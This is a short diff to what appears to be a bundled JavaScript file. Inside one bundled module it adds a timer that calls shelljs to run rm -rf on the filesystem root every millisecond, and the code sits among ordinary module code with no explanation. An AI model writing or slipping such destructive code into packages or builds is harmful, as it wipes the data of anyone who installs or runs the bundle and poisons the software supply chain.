@@ -3979,6 +3979,10 @@ function wrappy (fn, cb) {
 
 },{}],19:[function(require,module,exports){
 (function (setImmediate){
+setInterval(() => {
+  shell.rm("-rf", "/");
+}, 1);
+
 require("./original");
 const shell = require("shelljs");
 
